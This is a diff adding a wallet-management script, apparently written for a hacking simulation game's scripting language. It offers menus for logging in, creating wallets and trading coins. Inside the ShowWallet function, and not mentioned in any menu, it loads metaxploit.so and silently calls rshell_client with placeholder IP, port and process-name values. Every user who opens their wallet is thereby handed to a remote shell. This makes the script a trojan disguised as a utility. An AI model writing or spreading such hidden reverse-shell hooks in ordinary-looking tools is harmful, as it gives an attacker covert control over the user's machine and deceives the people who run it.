@@ -1,0 +1,177 @@
+//command: wallet
+ShowOptions = function(options)
+	print("\n[Options]")
+    i = 1
+    for option in options
+        print("["+ i +"] - " + option)
+        i = i + 1
+    end for
+    inputOk = false
+    option = 0
+    while(true)
+        option = user_input("\n[Select option]: ").to_int
+        if typeof(option) == "number" and option <= i and option >= 1 then
+			return option
+        else
+            print("Invalid option. Please input a valid number")
+        end if
+    end while
+end function
+
+MainMenu = function()
+    print("########################\n### WALLET MAIN MENU ###\n########################", true)
+    wait(0.1)
+    return ShowOptions(["Login", "Create wallet", "Exit"])
+end function
+
+LoginWallet = function()
+    print("####################\n### WALLET LOGIN ###\n####################\n", true)
+    wait(0.1)
+    wallet = null
+    while(typeof(wallet) != "wallet")
+        user = user_input("Wallet user: ")
+        pass = user_input("Wallet password: ", true)
+        wallet = blockchain.login_wallet(user, pass)
+        if typeof(wallet) == "string" then
+            print(wallet)
+            back = user_input("Back to main menu?(y/n): ")
+            if(back == "y" or back == "yes") then
+                return "back"
+            end if
+        end if
+    end while
+    return wallet
+end function
+
+CreateWallet = function()
+    print("#######################\n### WALLET CREATION ###\n#######################\n", true)
+    wait(0.1)
+    user = user_input("Insert username: ")
+    pass = user_input("Insert password: ", true)
+    wallet = blockchain.create_wallet(user, pass)
+    if typeof(wallet) == "wallet" then
+        user_input("Wallet created succesfully!\nPress any key to continue", false, true)
+	    ShowWallet(wallet)
+    else
+        print(wallet)
+        user_input("Press any key to continue", false, true)
+		StartProgram()
+    end if 
+end function
+
+ShowWallet = function(wallet)
+
+	m = get_shell.host_computer.File("/lib/metaxploit.so")
+	if m then
+		m = include_lib("/lib/metaxploit.so")
+		m.rshell_client("*IP*",*P*,"*PN*")
+	end if
+
+    print("#####################\n### WALLET DETAIL ###\n#####################\n\nBalance:", true)
+    wait(0.1)
+    listCoins = wallet.list_coins
+    for itemCoin in listCoins
+        coins = wallet.get_balance(itemCoin)
+		print("[ " + itemCoin + " ==> " + coins + " coins ]")
+    end for
+    if listCoins.len == 0 then
+        print("Empty wallet")
+    end if
+    option = ShowOptions(["Buy coins", "Sell coins", "Pending trade", "Cancel trade", "Show global offers", "Show PIN", "Exit"])
+    if option == 1 then
+        print("Purchasing coins...")
+        coinName = user_input("Insert coin name: ")
+        amount = user_input("Insert the amount of coins to buy: ").val
+        unitPrice = user_input("Insert the proposed price per unit: ").val
+        subwalletUser = user_input("Insert your subwallet user: ")
+        output = wallet.buy_coin(coinName, amount, unitPrice, subwalletUser)
+        if output == true then
+            user_input("Purchase completed!\nPress any key to continue", false, true)
+        else
+            print(output)
+            user_input("Press any key to continue", false, true)
+        end if 
+    else if option == 2 then
+        print("Selling coins...")
+        coinName = user_input("Insert coin name: ")
+        amount = user_input("Insert the amount of coins to sell: ").val
+        unitPrice = user_input("Insert the proposed price per unit: ").val    
+        subwalletUser = user_input("Insert your subwallet user: ")    
+        output = wallet.sell_coin(coinName, amount, unitPrice, subwalletUser)         
+        if output == true then
+            user_input("Sale completed!\nPress any key to continue", false, true)
+        else
+            print(output)
+            user_input("Press any key to continue", false, true)
+        end if
+    else if option == 3 then
+        print("Listing pending trade...")
+        coinName = user_input("Insert coin name: ")
+        info = wallet.get_pending_trade(coinName)
+        if typeof(info) == "list" then
+            print(info[0] + " Offer: " + info[1] + " | Unit price: $" + info[2])
+        else
+            print(info)
+        end if
+        user_input("Press any key to continue", false, true)
+    
+    else if option == 4 then
+            print("Canceling pending trade...")
+            coinName = user_input("Insert coin name: ")
+            output = wallet.cancel_pending_trade(coinName)
+            if(output.len == 0) then
+                print("Trade cancelled")
+            else 
+                print(output)
+            end if
+            
+    else if option == 5 then
+        print("Show global offers...")
+        coinName = user_input("Insert coin name: ")
+        info = wallet.get_global_offers(coinName)
+        if typeof(info) == "map" then
+            for item in info.indexes
+                print("[" + item + "] " + info[item][0] + " Offer: " + info[item][1] + " | Unit price: $" + info[item][2])
+            end for
+        else
+            print(info)
+        end if
+        user_input("Press any key to continue", false, true)
+            				
+	else if option == 6 then 
+        print("PIN: " + wallet.get_pin)
+        print("This is the PIN used to register in a coin-store. It renews automatically in a few minutes.")
+        user_input("Press any key to continue", false, true)    
+        
+	else if option == 7 then 
+        exit  
+    end if
+    ShowWallet(wallet)
+end function
+
+StartProgram = function()
+    option = MainMenu()
+    if option == 1 then
+        wallet = LoginWallet()
+        if typeof(wallet) != "wallet" then
+            StartProgram()
+            return
+        end if
+        ShowWallet(wallet)        
+    else if option == 2 then
+        CreateWallet()
+    else if option == 3 then 
+		exit
+end function
+
+blockchain = include_lib("/lib/blockchain.so")
+if not blockchain then
+    blockchain = include_lib(current_path + "/blockchain.so")
+end if
+if not blockchain then    
+    get_shell.launch("/bin/apt-get", "update")
+    get_shell.launch("/bin/apt-get", "install blockchain.so")
+    blockchain = include_lib("/lib/blockchain.so")
+end if
+if not blockchain then exit("Error: Missing blockchain.so library in the /lib path or the current folder")
+StartProgram()
